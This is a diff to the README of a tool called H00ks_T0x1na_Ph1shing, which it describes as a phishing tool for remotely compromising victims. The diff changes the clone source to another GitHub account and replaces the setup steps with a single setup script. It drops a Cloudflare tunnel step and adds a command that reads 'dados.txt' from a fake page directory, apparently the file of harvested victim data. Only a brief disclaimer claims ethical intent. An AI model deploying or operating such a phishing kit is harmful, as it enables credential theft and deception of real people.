@@ -8,22 +8,21 @@ H00ks_T0x1na_Ph1shing is a Phishing (Social Engineering) tool used to remotely c
 
 ### How do I use this tool? 
 ```
-sudo su && git clone https://github.com/cesarbtakeda/H00ks_T0x1na_Ph1shing.git
+sudo su && git clone https://github.com/z3ldr1/H00ks_T0x1na_Ph1shing.git
 ```
 ```
 cd H00ks_T0x1na_Ph1shing && ./requeriments.sh
 ```
 ```
-systemctl start apache2 && systemctl enable apache2.service
+./setup.sh 
 ```
-```
-cd /var/www/html/page && php -S localhost:8080
-```
+
 
 **In a new terminal**
 ```
-cd /var/www/html/page && cloudflare tunnel --url localhost:8080
+cd /var/wwww/html/page-fake && cat dados.txt
 ```
+
 ### Etical Disclamer
 Remember that this was made for ethical and moral use, I am not responsible for the misuse of the tool!
 
